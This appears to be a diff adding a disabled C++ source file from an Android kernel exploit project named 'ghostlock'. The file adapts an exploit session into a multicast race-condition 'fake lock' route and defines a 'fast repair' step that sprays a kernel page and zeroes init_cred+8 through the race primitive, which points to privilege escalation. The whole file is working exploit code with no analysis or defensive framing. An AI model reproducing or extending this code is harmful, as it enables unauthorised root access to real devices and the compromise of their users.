@@ -1,0 +1,98 @@
+/**
+ * @file route_multicast_policy.cpp.disabled
+ * @brief 已停用：multicast 的会话适配器与 W2 fast-repair policy（逻辑迁 Kotlin）。
+ * @note 恢复：mv route_multicast_policy.cpp.disabled route_multicast_policy.cpp。
+ */
+#include "route.h"
+#include "route_multicast.h"
+#include "session.h"
+#include "support.h"
+#include "profile.h"
+#include "memory.h"
+#include "params.h"
+#include "log.h"
+
+using namespace ghostlock;
+
+namespace ghostlock::route {
+    /**
+     * @brief 会话适配器：唯一读取 `g_exploit_session` 的位置。
+     *
+     * @note 目标函数 `do_mcast_fake_lock_route` 本身不访问全局；本适配器
+     *       在 Kotlin 直接传参落地前负责把会话字段搬进 POD。
+     */
+    route::RouteStatus do_mcast_route_from_session(const memory::WriteRequest *request) {
+        (void) request;
+        auto &session_state = session::g_exploit_session;
+        core::MulticastInputs in{
+            .layout = session_state.profile.multicast_layout(),
+            .fake_task = (session_state.heap.current.fake_task),
+            .fake_lock = (session_state.heap.current.fake_lock),
+            .consumer_calls = &session_state.race.consumer_calls,
+            .consumer_success = &session_state.race.consumer_success,
+            .consumer_stop = &session_state.race.consumer_stop,
+            .consumer_go = &session_state.race.consumer_go,
+            .consumer_inflight = &session_state.race.consumer_inflight,
+            .route_delay_usec = &session_state.race.route_delay_usec,
+            .attempts = static_cast<std::int32_t>(session_state.profile.execution()
+                                                      ? session_state.profile.execution()->mcast_attempts
+                                                      : 0),
+            .arm_sequence = static_cast<std::int32_t>(session_state.profile.execution()
+                                                          ? session_state.profile.execution()->mcast_arm_sequence
+                                                          : 0),
+            .arm_hold = static_cast<std::int32_t>(session_state.profile.execution()
+                                                      ? session_state.profile.execution()->mcast_arm_hold
+                                                      : 0),
+            .sockaddr_family_offset = 8,
+        };
+        return do_mcast_fake_lock_route(in);
+    }
+} // namespace ghostlock::route
+
+#if defined(__ANDROID__)
+
+namespace ghostlock::route {
+    /* MulticastPolicy route hooks (Batch 4). Declared in route_policy.hpp,
+     * defined here because the implementations are Android-only. The one-shot
+     * route owns its resources in multicast::MulticastRoute and shares only the
+     * pure payload encoding. */
+    bool MulticastPolicy::w2_fast_repair_prebuild(
+        session::ExploitSession &exploit_session) noexcept {
+        const memory::WriteRequest repair_request = memory::WriteRequest::make(
+            exploit_session.addresses.data_alias(
+                exploit_session.addresses.init_cred_image_addr()) + 8,
+            memory::WriteMode::Zero, 1);
+        (exploit_session.heap.current.base) =
+                support::prepare_good_kernel_page(
+                support::page_spray_inputs_from_session(repair_request));
+        if (!(exploit_session.heap.current.base) || !support::stash_prebuilt_page()) {
+            pr_warning("W2 fast repair prebuild failed\n");
+            support::discard_prebuilt_page();
+            return false;
+        }
+        pr_info("W2 fast repair payload prebuilt\n");
+        return true;
+    }
+
+    bool MulticastPolicy::w2_fast_repair_activate(
+        session::ExploitSession &exploit_session) noexcept {
+        if (!support::activate_prebuilt_page()) {
+            pr_warning("W2 fast repair activation failed\n");
+            return false;
+        }
+        const memory::WriteRequest repair_request = memory::WriteRequest::make(
+            exploit_session.addresses.data_alias(
+                exploit_session.addresses.init_cred_image_addr()) + 8,
+            memory::WriteMode::Zero, 1);
+        pr_info("W2b: firing prebuilt init_cred+8 repair\n");
+        exploit_session.race.fast_repair.store(1);
+        const Status repaired = race::run_main_route_threads_from_session(repair_request);
+        exploit_session.race.fast_repair.store(0);
+        if (!repaired) {
+            pr_warning("W2 fast repair route failed\n");
+            return false;
+        }
+        return true;
+    }
+} // namespace ghostlock::route
+#endif
